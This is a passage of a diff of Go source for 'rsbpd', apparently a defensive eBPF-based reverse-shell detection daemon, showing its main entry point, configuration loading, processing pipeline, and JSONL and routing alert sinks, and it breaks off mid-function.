@@ -1,0 +1,3294 @@
+]633;E;wc -l AUDIT_CHANGED_FILES_FULL.txt;8a9f09c4-3b6d-4bb6-b158-848ae0db1f90]633;C=== cmd/rsbpd/main.go ===
+package main
+
+import (
+	"bytes"
+	"context"
+	"encoding/json"
+	"errors"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"os/signal"
+	"runtime"
+	"strconv"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"syscall"
+	"time"
+
+	"github.com/prometheus/client_golang/prometheus/promhttp"
+	"github.com/spf13/cobra"
+	"github.com/spf13/viper"
+	"go.uber.org/zap"
+	"golang.org/x/sys/unix"
+
+	"github.com/yoursec/rsbp/internal/alert"
+	"github.com/yoursec/rsbp/internal/api"
+	"github.com/yoursec/rsbp/internal/correlation"
+	"github.com/yoursec/rsbp/internal/detection"
+	"github.com/yoursec/rsbp/internal/ebpf"
+	"github.com/yoursec/rsbp/internal/enrichment"
+	"github.com/yoursec/rsbp/internal/forensics"
+	"github.com/yoursec/rsbp/internal/output"
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+var (
+	Version   = "dev"
+	BuildTime = "unknown"
+)
+
+type appConfig struct {
+	RSBP struct {
+		Agent struct {
+			Hostname string `mapstructure:"hostname"`
+			LogLevel string `mapstructure:"log_level"`
+			PIDFile  string `mapstructure:"pid_file"`
+		} `mapstructure:"agent"`
+		Detection struct {
+			WindowSeconds      int     `mapstructure:"window_seconds"`
+			ScoreThreshold     float64 `mapstructure:"score_threshold"`
+			AllowPrivateRemote bool    `mapstructure:"allow_private_remote"`
+			EnableBaseline     bool    `mapstructure:"enable_baseline"`
+			BaselineFile       string  `mapstructure:"baseline_file"`
+		} `mapstructure:"detection"`
+		Whitelist struct {
+			Paths        []string `mapstructure:"paths"`
+			IPs          []string `mapstructure:"ips"`
+			Users        []uint32 `mapstructure:"users"`
+			ProcessNames []string `mapstructure:"process_names"`
+		} `mapstructure:"whitelist"`
+		Enrichment struct {
+			GeoIPDBCity     string `mapstructure:"geoip_db_city"`
+			GeoIPDBASN      string `mapstructure:"geoip_db_asn"`
+			AbuseIPDBCache  string `mapstructure:"abuseipdb_cache"`
+			AbuseIPDBAPIKey string `mapstructure:"abuseipdb_api_key"`
+		} `mapstructure:"enrichment"`
+		Forensics struct {
+			Enabled          bool   `mapstructure:"enabled"`
+			OutputDir        string `mapstructure:"output_dir"`
+			CapturePCAP      bool   `mapstructure:"capture_pcap"`
+			PCAPDurationSecs int    `mapstructure:"pcap_duration_seconds"`
+			PCAPMaxBytes     int    `mapstructure:"pcap_max_bytes"`
+		} `mapstructure:"forensics"`
+		Outputs struct {
+			JSONL struct {
+				Enabled bool   `mapstructure:"enabled"`
+				Path    string `mapstructure:"path"`
+			} `mapstructure:"jsonl"`
+			Elasticsearch struct {
+				Enabled   bool     `mapstructure:"enabled"`
+				Addresses []string `mapstructure:"addresses"`
+				TLSCACert string   `mapstructure:"tls_ca_cert"`
+			} `mapstructure:"elasticsearch"`
+			Splunk struct {
+				Enabled bool   `mapstructure:"enabled"`
+				URL     string `mapstructure:"url"`
+				Token   string `mapstructure:"token"`
+			} `mapstructure:"splunk"`
+			Kafka struct {
+				Enabled bool     `mapstructure:"enabled"`
+				Brokers []string `mapstructure:"brokers"`
+				Topic   string   `mapstructure:"topic"`
+			} `mapstructure:"kafka"`
+			Syslog struct {
+				Enabled bool   `mapstructure:"enabled"`
+				Network string `mapstructure:"network"`
+				Address string `mapstructure:"address"`
+			} `mapstructure:"syslog"`
+			Webhook struct {
+				Enabled bool   `mapstructure:"enabled"`
+				URL     string `mapstructure:"url"`
+				Secret  string `mapstructure:"secret"`
+			} `mapstructure:"webhook"`
+		} `mapstructure:"outputs"`
+		API struct {
+			Enabled       bool   `mapstructure:"enabled"`
+			Listen        string `mapstructure:"listen"`
+			MetricsListen string `mapstructure:"metrics_listen"`
+			BearerToken   string `mapstructure:"bearer_token"`
+		} `mapstructure:"api"`
+	} `mapstructure:"rsbp"`
+}
+
+func main() {
+	rootCmd := &cobra.Command{
+		Use:   "rsbpd",
+		Short: "Reverse Shell Behavior Profiler daemon",
+	}
+
+	var cfgPath string
+	rootCmd.PersistentFlags().StringVar(&cfgPath, "config", "config/rsbp.yaml", "Path to config file")
+
+	runCmd := &cobra.Command{Use: "run", Short: "Start the daemon", RunE: func(cmd *cobra.Command, args []string) error {
+		return runDaemon(cfgPath)
+	}}
+
+	statusCmd := &cobra.Command{Use: "status", Short: "Print daemon status", RunE: func(cmd *cobra.Command, args []string) error {
+		cfg, err := loadConfig(cfgPath)
+		if err != nil {
+			return err
+		}
+		return printJSONFromAPI("http://"+cfg.RSBP.API.Listen+"/health", cfg.RSBP.API.BearerToken)
+	}}
+
+	var follow bool
+	alertsCmd := &cobra.Command{Use: "alerts", Short: "Tail local alerts JSONL", RunE: func(cmd *cobra.Command, args []string) error {
+		cfg, err := loadConfig(cfgPath)
+		if err != nil {
+			return err
+		}
+		return tailAlerts(cfg.RSBP.Outputs.JSONL.Path, follow)
+	}}
+	alertsCmd.Flags().BoolVar(&follow, "follow", false, "Follow appended alerts")
+
+	whitelistCmd := &cobra.Command{Use: "whitelist", Short: "Manage whitelist via API"}
+	var wlIP, wlPath string
+	whitelistAddCmd := &cobra.Command{Use: "add", Short: "Add whitelist entry", RunE: func(cmd *cobra.Command, args []string) error {
+		cfg, err := loadConfig(cfgPath)
+		if err != nil {
+			return err
+		}
+		body := map[string]any{"ips": []string{}, "paths": []string{}}
+		if wlIP != "" {
+			body["ips"] = []string{wlIP}
+		}
+		if wlPath != "" {
+			body["paths"] = []string{wlPath}
+		}
+		return postJSON("http://"+cfg.RSBP.API.Listen+"/whitelist", body, cfg.RSBP.API.BearerToken)
+	}}
+	whitelistAddCmd.Flags().StringVar(&wlIP, "ip", "", "IP/CIDR whitelist entry")
+	whitelistAddCmd.Flags().StringVar(&wlPath, "path", "", "Executable path whitelist entry")
+	whitelistCmd.AddCommand(whitelistAddCmd)
+
+	testCmd := &cobra.Command{Use: "test", Short: "Run self-test via API synthetic event", RunE: func(cmd *cobra.Command, args []string) error {
+		cfg, err := loadConfig(cfgPath)
+		if err != nil {
+			return err
+		}
+		return postJSON("http://"+cfg.RSBP.API.Listen+"/test", map[string]any{"source": "cli"}, cfg.RSBP.API.BearerToken)
+	}}
+
+	versionCmd := &cobra.Command{Use: "version", Short: "Print build and runtime version information", Run: func(cmd *cobra.Command, args []string) {
+		fmt.Printf("version=%s\nbuild_time=%s\ngo=%s\nkernel_requirement=%s\n", Version, BuildTime, runtime.Version(), ">=5.8")
+	}}
+
+	rootCmd.AddCommand(runCmd, statusCmd, alertsCmd, whitelistCmd, testCmd, versionCmd)
+	if err := rootCmd.Execute(); err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+}
+
+func runDaemon(configPath string) error {
+	cfg, err := loadConfig(configPath)
+	if err != nil {
+		return err
+	}
+
+	logger, err := newConfiguredLogger(cfg.RSBP.Agent.LogLevel)
+	if err != nil {
+		return fmt.Errorf("logger init failed: %w", err)
+	}
+	defer func() {
+		_ = logger.Sync()
+	}()
+
+	rootCtx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	if cfg.RSBP.Agent.Hostname == "" {
+		hostname, hostErr := os.Hostname()
+		if hostErr == nil {
+			cfg.RSBP.Agent.Hostname = hostname
+		} else {
+			cfg.RSBP.Agent.Hostname = "unknown-host"
+		}
+	}
+
+	hostOS := detectOSName()
+	kernelVersion := detectKernelVersion()
+	agentVersion := Version
+	if strings.TrimSpace(agentVersion) == "" {
+		agentVersion = "dev"
+	}
+
+	if cfg.RSBP.Agent.PIDFile != "" {
+		_ = os.WriteFile(cfg.RSBP.Agent.PIDFile, []byte(strconv.Itoa(os.Getpid())), 0o644)
+		defer os.Remove(cfg.RSBP.Agent.PIDFile)
+	}
+
+	var eventsProcessed atomic.Uint64
+
+	eventCh := make(chan types.SyscallEvent, 4096)
+	rawAlertCh := make(chan *types.ReverseShellAlert, 1024)
+	finalAlertCh := make(chan *types.ReverseShellAlert, 1024)
+
+	ebpfLoader, err := ebpf.New(logger)
+	if err != nil {
+		logger.Fatal("failed to initialize ebpf loader", zap.Error(err))
+	}
+	defer func() {
+		if closeErr := ebpfLoader.Close(); closeErr != nil {
+			logger.Warn("failed to close ebpf loader", zap.Error(closeErr))
+		}
+	}()
+
+	tracker := correlation.NewTracker(time.Duration(cfg.RSBP.Detection.WindowSeconds) * time.Second)
+	correlation.SetAllowPrivateRemote(cfg.RSBP.Detection.AllowPrivateRemote)
+	detector := detection.NewEngine(detection.Config{
+		ExecConnectWindowSeconds: cfg.RSBP.Detection.WindowSeconds,
+		MinScore:                 cfg.RSBP.Detection.ScoreThreshold,
+		EnableBaseline:           cfg.RSBP.Detection.EnableBaseline,
+		BaselineFile:             cfg.RSBP.Detection.BaselineFile,
+		Whitelist: detection.WhitelistConfig{
+			Paths:        append([]string(nil), cfg.RSBP.Whitelist.Paths...),
+			IPs:          append([]string(nil), cfg.RSBP.Whitelist.IPs...),
+			Users:        append([]uint32(nil), cfg.RSBP.Whitelist.Users...),
+			ProcessNames: append([]string(nil), cfg.RSBP.Whitelist.ProcessNames...),
+		},
+	}, logger)
+	enricher := enrichment.NewEnricher(enrichment.Config{
+		GeoIPDBPath:      cfg.RSBP.Enrichment.GeoIPDBCity,
+		ASNDBPath:        cfg.RSBP.Enrichment.GeoIPDBASN,
+		AbuseCachePath:   cfg.RSBP.Enrichment.AbuseIPDBCache,
+		AbuseIPDBAPIKey:  cfg.RSBP.Enrichment.AbuseIPDBAPIKey,
+		AbuseIPDBEnabled: cfg.RSBP.Enrichment.AbuseIPDBAPIKey != "",
+	}, logger)
+	collector := forensics.NewCollector(forensics.Config{
+		ArtifactDir:    cfg.RSBP.Forensics.OutputDir,
+		EnableMiniPCAP: cfg.RSBP.Forensics.Enabled && cfg.RSBP.Forensics.CapturePCAP,
+	}, logger)
+	collectorCfg := forensics.CollectorConfig{
+		PCAPDuration: time.Duration(cfg.RSBP.Forensics.PCAPDurationSecs) * time.Second,
+		PCAPMaxBytes: int64(cfg.RSBP.Forensics.PCAPMaxBytes),
+	}
+
+	outputCfg := output.Config{}
+	if cfg.RSBP.Outputs.JSONL.Enabled {
+		outputCfg.Enabled = append(outputCfg.Enabled, "jsonl")
+	}
+	if cfg.RSBP.Outputs.Elasticsearch.Enabled {
+		outputCfg.Enabled = append(outputCfg.Enabled, "elasticsearch")
+	}
+	if cfg.RSBP.Outputs.Splunk.Enabled {
+		outputCfg.Enabled = append(outputCfg.Enabled, "splunk")
+	}
+	if cfg.RSBP.Outputs.Kafka.Enabled {
+		outputCfg.Enabled = append(outputCfg.Enabled, "kafka")
+	}
+	if cfg.RSBP.Outputs.Syslog.Enabled {
+		outputCfg.Enabled = append(outputCfg.Enabled, "syslog")
+	}
+	if cfg.RSBP.Outputs.Webhook.Enabled {
+		outputCfg.Enabled = append(outputCfg.Enabled, "webhook")
+	}
+	outputCfg.JSONL.Path = cfg.RSBP.Outputs.JSONL.Path
+	outputCfg.Elasticsearch.Addresses = cfg.RSBP.Outputs.Elasticsearch.Addresses
+	outputCfg.Elasticsearch.CertPath = cfg.RSBP.Outputs.Elasticsearch.TLSCACert
+	outputCfg.Splunk.Endpoint = cfg.RSBP.Outputs.Splunk.URL
+	outputCfg.Splunk.Token = cfg.RSBP.Outputs.Splunk.Token
+	outputCfg.Splunk.Hostname = cfg.RSBP.Agent.Hostname
+	outputCfg.Kafka.Brokers = cfg.RSBP.Outputs.Kafka.Brokers
+	outputCfg.Kafka.Topic = cfg.RSBP.Outputs.Kafka.Topic
+	outputCfg.Syslog.Network = cfg.RSBP.Outputs.Syslog.Network
+	outputCfg.Syslog.Address = cfg.RSBP.Outputs.Syslog.Address
+	outputCfg.Webhook.URL = cfg.RSBP.Outputs.Webhook.URL
+	outputCfg.Webhook.Secret = cfg.RSBP.Outputs.Webhook.Secret
+
+	sinks, err := output.NewSinks(outputCfg, logger)
+	if err != nil {
+		return fmt.Errorf("failed to initialize outputs: %w", err)
+	}
+	defer sinks.Close()
+	emitter := alert.NewEmitter(sinks, logger)
+
+	var wg sync.WaitGroup
+
+	// Kernel event collection runs independently so userspace processing can apply backpressure.
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer close(eventCh)
+		if runErr := ebpfLoader.Run(rootCtx, eventCh); runErr != nil && !errors.Is(runErr, context.Canceled) {
+			logger.Error("ebpf collector exited with error", zap.Error(runErr))
+			cancel()
+		}
+	}()
+
+	// Correlation and detection stay together to preserve event ordering per PID.
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer close(rawAlertCh)
+		for ev := range eventCh {
+			eventsProcessed.Add(1)
+			session := tracker.Consume(ev)
+			alerts := detector.Evaluate(session, ev, cfg.RSBP.Agent.Hostname)
+			for _, a := range alerts {
+				select {
+				case rawAlertCh <- a:
+				case <-rootCtx.Done():
+					return
+				}
+			}
+		}
+	}()
+
+	// Enrichment and forensic collection happen after detection to limit expensive operations.
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		defer close(finalAlertCh)
+		for a := range rawAlertCh {
+			if a.Metadata == nil {
+				a.Metadata = map[string]string{}
+			}
+			a.Metadata["hostname"] = cfg.RSBP.Agent.Hostname
+			a.Metadata["os"] = hostOS
+			a.Metadata["kernel_version"] = kernelVersion
+			a.Metadata["agent_version"] = agentVersion
+			enricher.EnrichAlert(rootCtx, a)
+			if cfg.RSBP.Forensics.Enabled {
+				collector.Collect(rootCtx, a, collectorCfg)
+			}
+			select {
+			case finalAlertCh <- a:
+			case <-rootCtx.Done():
+				return
+			}
+		}
+	}()
+
+	if cfg.RSBP.API.Enabled {
+		if cfg.RSBP.API.MetricsListen != "" {
+			go func() {
+				mux := http.NewServeMux()
+				mux.Handle("/metrics", promhttp.Handler())
+				_ = (&http.Server{Addr: cfg.RSBP.API.MetricsListen, Handler: mux}).ListenAndServe()
+			}()
+		}
+
+		apiSrv := api.NewServer(api.Config{
+			Enabled:       cfg.RSBP.API.Enabled,
+			Listen:        cfg.RSBP.API.Listen,
+			MetricsListen: cfg.RSBP.API.MetricsListen,
+			BearerToken:   cfg.RSBP.API.BearerToken,
+			AlertsPath:    cfg.RSBP.Outputs.JSONL.Path,
+		}, logger, &eventsProcessed, func() map[string]any {
+			return map[string]any{"ebpf": ebpfLoader.Stats()}
+		}, func(context.Context) error {
+			_, err := loadConfig(configPath)
+			return err
+		}, func(context.Context) error {
+			synthetic := types.SyscallEvent{PID: 99999, TimestampNS: uint64(time.Now().UnixNano())}
+			select {
+			case eventCh <- synthetic:
+				return nil
+			default:
+				return fmt.Errorf("event channel busy")
+			}
+		})
+
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			if err := apiSrv.Run(rootCtx); err != nil && !errors.Is(err, http.ErrServerClosed) {
+				logger.Error("api server failed", zap.Error(err))
+				cancel()
+			}
+		}()
+	}
+
+	// Emission is isolated from detection to avoid sink outages blocking core telemetry.
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		for a := range finalAlertCh {
+			if emitErr := emitter.Emit(rootCtx, a); emitErr != nil {
+				logger.Error("failed to emit alert", zap.String("alert_id", a.AlertID), zap.Error(emitErr))
+			}
+		}
+	}()
+
+	sigCh := make(chan os.Signal, 1)
+	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
+
+	select {
+	case sig := <-sigCh:
+		logger.Info("shutdown signal received", zap.String("signal", sig.String()))
+		cancel()
+	case <-rootCtx.Done():
+	}
+
+	shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer shutdownCancel()
+
+	finished := make(chan struct{})
+	go func() {
+		defer close(finished)
+		wg.Wait()
+	}()
+
+	select {
+	case <-finished:
+		logger.Info("daemon stopped cleanly")
+	case <-shutdownCtx.Done():
+		logger.Warn("graceful shutdown timed out")
+	}
+
+	if err := detector.SaveBaseline(); err != nil {
+		logger.Warn("failed to save baseline", zap.Error(err))
+	}
+
+	return nil
+}
+
+func loadConfig(configPath string) (*appConfig, error) {
+	v := viper.New()
+	v.SetConfigFile(configPath)
+	v.SetConfigType("yaml")
+	v.SetDefault("rsbp.agent.log_level", "info")
+	v.SetDefault("rsbp.agent.hostname", "")
+	v.SetDefault("rsbp.agent.pid_file", "/var/run/rsbp.pid")
+	v.SetDefault("rsbp.detection.window_seconds", 5)
+	v.SetDefault("rsbp.detection.score_threshold", 0.5)
+	v.SetDefault("rsbp.detection.allow_private_remote", true)
+	v.SetDefault("rsbp.detection.enable_baseline", true)
+	v.SetDefault("rsbp.detection.baseline_file", "/var/lib/rsbp/baseline.json")
+	v.SetDefault("rsbp.outputs.jsonl.enabled", true)
+	v.SetDefault("rsbp.outputs.jsonl.path", "/var/log/rsbp/alerts.jsonl")
+	v.SetDefault("rsbp.api.enabled", true)
+	v.SetDefault("rsbp.api.listen", "127.0.0.1:9001")
+	v.SetDefault("rsbp.api.metrics_listen", "0.0.0.0:9090")
+
+	if err := v.ReadInConfig(); err != nil {
+		return nil, fmt.Errorf("read config: %w", err)
+	}
+
+	var cfg appConfig
+	if err := v.Unmarshal(&cfg); err != nil {
+		return nil, fmt.Errorf("unmarshal config: %w", err)
+	}
+
+	return &cfg, nil
+}
+
+func printJSONFromAPI(url string, bearerToken string) error {
+	req, err := http.NewRequest(http.MethodGet, url, nil)
+	if err != nil {
+		return err
+	}
+	if bearerToken != "" {
+		req.Header.Set("Authorization", "Bearer "+bearerToken)
+	}
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode >= 300 {
+		body, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("api status %d: %s", resp.StatusCode, string(body))
+	}
+	var pretty bytes.Buffer
+	if err := json.Indent(&pretty, mustReadAll(resp.Body), "", "  "); err != nil {
+		return err
+	}
+	fmt.Println(pretty.String())
+	return nil
+}
+
+func postJSON(url string, body any, bearerToken string) error {
+	payload, err := json.Marshal(body)
+	if err != nil {
+		return err
+	}
+	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(payload))
+	if err != nil {
+		return err
+	}
+	req.Header.Set("Content-Type", "application/json")
+	if bearerToken != "" {
+		req.Header.Set("Authorization", "Bearer "+bearerToken)
+	}
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	respBody, _ := io.ReadAll(resp.Body)
+	if resp.StatusCode >= 300 {
+		return fmt.Errorf("api status %d: %s", resp.StatusCode, string(respBody))
+	}
+	fmt.Println(string(respBody))
+	return nil
+}
+
+func tailAlerts(path string, follow bool) error {
+	ch, err := output.TailAlerts(path, follow)
+	if err != nil {
+		return err
+	}
+	enc := json.NewEncoder(os.Stdout)
+	enc.SetIndent("", "  ")
+	for a := range ch {
+		if err := enc.Encode(a); err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
+func mustReadAll(r io.Reader) []byte {
+	b, _ := io.ReadAll(r)
+	return b
+}
+
+func newConfiguredLogger(levelRaw string) (*zap.Logger, error) {
+	level := zap.InfoLevel
+	normalized := strings.ToLower(strings.TrimSpace(levelRaw))
+	if normalized == "" {
+		normalized = "info"
+	}
+	if err := level.Set(normalized); err != nil {
+		logger, logErr := zap.NewProduction(zap.IncreaseLevel(zap.NewAtomicLevelAt(zap.InfoLevel)))
+		if logErr != nil {
+			return nil, logErr
+		}
+		logger.Warn("invalid log level configured, defaulting to info", zap.String("configured", levelRaw))
+		return logger, nil
+	}
+
+	atomicLevel := zap.NewAtomicLevelAt(level)
+	logger, err := zap.NewProduction(zap.IncreaseLevel(atomicLevel))
+	if err != nil {
+		return nil, err
+	}
+	return logger, nil
+}
+
+func detectOSName() string {
+	data, err := os.ReadFile("/etc/os-release")
+	if err != nil {
+		return runtime.GOOS
+	}
+	for _, line := range strings.Split(string(data), "\n") {
+		line = strings.TrimSpace(line)
+		if !strings.HasPrefix(line, "PRETTY_NAME=") {
+			continue
+		}
+		value := strings.TrimPrefix(line, "PRETTY_NAME=")
+		return strings.Trim(value, "\"")
+	}
+	return runtime.GOOS
+}
+
+func detectKernelVersion() string {
+	var u unix.Utsname
+	if err := unix.Uname(&u); err != nil {
+		return ""
+	}
+	buf := make([]byte, 0, len(u.Release))
+	for _, c := range u.Release {
+		if c == 0 {
+			break
+		}
+		buf = append(buf, byte(c))
+	}
+	return string(buf)
+}
+
+=== internal/output/jsonl.go ===
+package output
+
+import (
+	"bufio"
+	"context"
+	"encoding/json"
+	"fmt"
+	"os"
+	"path/filepath"
+	"sort"
+	"strings"
+	"sync"
+	"time"
+
+	"github.com/fsnotify/fsnotify"
+	alertpkg "github.com/yoursec/rsbp/internal/alert"
+	"go.uber.org/zap"
+)
+
+type JSONLSinkConfig struct {
+	Path string `mapstructure:"path"`
+}
+
+type JSONLSink struct {
+	name    string
+	path    string
+	logger  *zap.Logger
+	mu      sync.Mutex
+	file    *os.File
+	dateKey string
+	syncTk  *time.Ticker
+	stopCh  chan struct{}
+	stopped chan struct{}
+}
+
+func NewJSONLSink(cfg JSONLSinkConfig, logger *zap.Logger) (*JSONLSink, error) {
+	if cfg.Path == "" {
+		cfg.Path = "/var/log/rsbp/alerts.jsonl"
+	}
+	if logger == nil {
+		logger = zap.NewNop()
+	}
+
+	if err := os.MkdirAll(filepath.Dir(cfg.Path), 0o755); err != nil {
+		return nil, err
+	}
+	_ = os.Chmod(filepath.Dir(cfg.Path), 0o755)
+	_ = os.Chown(filepath.Dir(cfg.Path), os.Getuid(), os.Getgid())
+
+	f, err := os.OpenFile(cfg.Path, os.O_CREATE|os.O_APPEND|os.O_RDWR, 0o644)
+	if err != nil {
+		return nil, err
+	}
+	_ = f.Chmod(0o644)
+
+	s := &JSONLSink{
+		name:    "jsonl",
+		path:    cfg.Path,
+		logger:  logger,
+		file:    f,
+		dateKey: time.Now().Format("2006-01-02"),
+		syncTk:  time.NewTicker(time.Second),
+		stopCh:  make(chan struct{}),
+		stopped: make(chan struct{}),
+	}
+
+	go s.loopSync()
+	return s, nil
+}
+
+func (s *JSONLSink) Name() string { return s.name }
+
+func (s *JSONLSink) Send(_ context.Context, alert *alertpkg.ReverseShellAlert) error {
+	if alert == nil {
+		return nil
+	}
+
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	if err := s.rotateIfNeededLocked(); err != nil {
+		return err
+	}
+
+	line, err := json.Marshal(alert)
+	if err != nil {
+		return err
+	}
+
+	// Atomic write via temp file + rename to avoid partial JSON corruption.
+	tmp := s.path + ".tmp"
+	oldData, _ := os.ReadFile(s.path)
+	if err := os.WriteFile(tmp, append(append(oldData, line...), '\n'), 0o644); err != nil {
+		return err
+	}
+	if err := os.Rename(tmp, s.path); err != nil {
+		return err
+	}
+
+	if s.file != nil {
+		_ = s.file.Close()
+	}
+	f, err := os.OpenFile(s.path, os.O_CREATE|os.O_APPEND|os.O_RDWR, 0o644)
+	if err != nil {
+		return err
+	}
+	_ = f.Chmod(0o644)
+	s.file = f
+	return nil
+}
+
+func (s *JSONLSink) Flush() error {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	if s.file == nil {
+		return nil
+	}
+	return s.file.Sync()
+}
+
+func (s *JSONLSink) Close() error {
+	close(s.stopCh)
+	<-s.stopped
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	if s.file != nil {
+		_ = s.file.Sync()
+		return s.file.Close()
+	}
+	return nil
+}
+
+func (s *JSONLSink) loopSync() {
+	defer close(s.stopped)
+	for {
+		select {
+		case <-s.stopCh:
+			return
+		case <-s.syncTk.C:
+			_ = s.Flush()
+		}
+	}
+}
+
+func (s *JSONLSink) rotateIfNeededLocked() error {
+	today := time.Now().Format("2006-01-02")
+	if today == s.dateKey {
+		return nil
+	}
+	if s.file != nil {
+		_ = s.file.Sync()
+		_ = s.file.Close()
+	}
+
+	rotated := filepath.Join(filepath.Dir(s.path), fmt.Sprintf("alerts.%s.jsonl", s.dateKey))
+	if _, err := os.Stat(s.path); err == nil {
+		_ = os.Rename(s.path, rotated)
+	}
+
+	s.dateKey = today
+	f, err := os.OpenFile(s.path, os.O_CREATE|os.O_APPEND|os.O_RDWR, 0o644)
+	if err != nil {
+		return err
+	}
+	_ = f.Chmod(0o644)
+	s.file = f
+
+	return pruneOldRotations(filepath.Dir(s.path), 30)
+}
+
+func pruneOldRotations(dir string, keep int) error {
+	entries, err := os.ReadDir(dir)
+	if err != nil {
+		return err
+	}
+	var files []string
+	for _, e := range entries {
+		name := e.Name()
+		if strings.HasPrefix(name, "alerts.") && strings.HasSuffix(name, ".jsonl") {
+			files = append(files, filepath.Join(dir, name))
+		}
+	}
+	sort.Strings(files)
+	if len(files) <= keep {
+		return nil
+	}
+	for _, f := range files[:len(files)-keep] {
+		_ = os.Remove(f)
+	}
+	return nil
+}
+
+func TailAlerts(path string, follow bool) (<-chan *alertpkg.ReverseShellAlert, error) {
+	out := make(chan *alertpkg.ReverseShellAlert, 128)
+	f, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+
+	go func() {
+		defer close(out)
+		defer f.Close()
+
+		reader := bufio.NewReader(f)
+		for {
+			line, readErr := reader.ReadString('\n')
+			if readErr != nil {
+				break
+			}
+			var a alertpkg.ReverseShellAlert
+			if err := json.Unmarshal([]byte(strings.TrimSpace(line)), &a); err == nil {
+				out <- &a
+			}
+		}
+
+		if !follow {
+			return
+		}
+
+		watcher, err := fsnotify.NewWatcher()
+		if err != nil {
+			return
+		}
+		defer watcher.Close()
+		_ = watcher.Add(filepath.Dir(path))
+
+		for ev := range watcher.Events {
+			if ev.Op&(fsnotify.Write|fsnotify.Create) == 0 || filepath.Clean(ev.Name) != filepath.Clean(path) {
+				continue
+			}
+			current, err := os.Open(path)
+			if err != nil {
+				continue
+			}
+			scanner := bufio.NewScanner(current)
+			for scanner.Scan() {
+				var a alertpkg.ReverseShellAlert
+				if json.Unmarshal(scanner.Bytes(), &a) == nil {
+					out <- &a
+				}
+			}
+			_ = current.Close()
+		}
+	}()
+
+	return out, nil
+}
+
+=== internal/output/sink.go ===
+package output
+
+import (
+	"context"
+	"fmt"
+	"sync"
+	"time"
+
+	"github.com/prometheus/client_golang/prometheus"
+	"go.uber.org/zap"
+
+	alertpkg "github.com/yoursec/rsbp/internal/alert"
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+type Sink interface {
+	Name() string
+	Send(ctx context.Context, alert *alertpkg.ReverseShellAlert) error
+	Flush() error
+	Close() error
+}
+
+type RouterMetrics struct {
+	SentTotal   *prometheus.CounterVec
+	ErrorsTotal *prometheus.CounterVec
+	Latency     *prometheus.HistogramVec
+}
+
+type Router struct {
+	sinks   []Sink
+	logger  *zap.Logger
+	metrics *RouterMetrics
+}
+
+type Config struct {
+	Enabled       []string            `mapstructure:"enabled"`
+	Elasticsearch ElasticsearchConfig `mapstructure:"elasticsearch"`
+	Splunk        SplunkConfig        `mapstructure:"splunk"`
+	Kafka         KafkaConfig         `mapstructure:"kafka"`
+	Syslog        SyslogConfig        `mapstructure:"syslog"`
+	JSONL         JSONLSinkConfig     `mapstructure:"jsonl"`
+	Webhook       WebhookConfig       `mapstructure:"webhook"`
+}
+
+var routerMetricsOnce sync.Once
+
+func newRouterMetrics() *RouterMetrics {
+	m := &RouterMetrics{
+		SentTotal: prometheus.NewCounterVec(prometheus.CounterOpts{
+			Namespace: "rsbp",
+			Subsystem: "output",
+			Name:      "output_sent_total",
+			Help:      "Total alerts successfully sent by sink.",
+		}, []string{"sink"}),
+		ErrorsTotal: prometheus.NewCounterVec(prometheus.CounterOpts{
+			Namespace: "rsbp",
+			Subsystem: "output",
+			Name:      "output_errors_total",
+			Help:      "Total output errors by sink.",
+		}, []string{"sink"}),
+		Latency: prometheus.NewHistogramVec(prometheus.HistogramOpts{
+			Namespace: "rsbp",
+			Subsystem: "output",
+			Name:      "output_latency_seconds",
+			Help:      "Alert output send latency by sink.",
+			Buckets:   prometheus.DefBuckets,
+		}, []string{"sink"}),
+	}
+
+	routerMetricsOnce.Do(func() {
+		_ = prometheus.Register(m.SentTotal)
+		_ = prometheus.Register(m.ErrorsTotal)
+		_ = prometheus.Register(m.Latency)
+	})
+
+	return m
+}
+
+func NewRouter(sinks []Sink, logger *zap.Logger) *Router {
+	if logger == nil {
+		logger = zap.NewNop()
+	}
+	return &Router{sinks: sinks, logger: logger, metrics: newRouterMetrics()}
+}
+
+func (r *Router) Send(ctx context.Context, a *alertpkg.ReverseShellAlert) {
+	if r == nil || a == nil {
+		return
+	}
+
+	var wg sync.WaitGroup
+	for _, sink := range r.sinks {
+		s := sink
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			start := time.Now()
+			timeoutCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
+			defer cancel()
+
+			if err := s.Send(timeoutCtx, a); err != nil {
+				r.metrics.ErrorsTotal.WithLabelValues(s.Name()).Inc()
+				r.logger.Warn("sink send failed", zap.String("sink", s.Name()), zap.String("alert_id", a.ID), zap.Error(err))
+				return
+			}
+
+			r.metrics.SentTotal.WithLabelValues(s.Name()).Inc()
+			r.metrics.Latency.WithLabelValues(s.Name()).Observe(time.Since(start).Seconds())
+		}()
+	}
+	wg.Wait()
+}
+
+func (r *Router) Flush() {
+	if r == nil {
+		return
+	}
+	for _, sink := range r.sinks {
+		if err := sink.Flush(); err != nil {
+			r.logger.Warn("sink flush failed", zap.String("sink", sink.Name()), zap.Error(err))
+		}
+	}
+}
+
+func (r *Router) Close() {
+	if r == nil {
+		return
+	}
+	for _, sink := range r.sinks {
+		if err := sink.Close(); err != nil {
+			r.logger.Warn("sink close failed", zap.String("sink", sink.Name()), zap.Error(err))
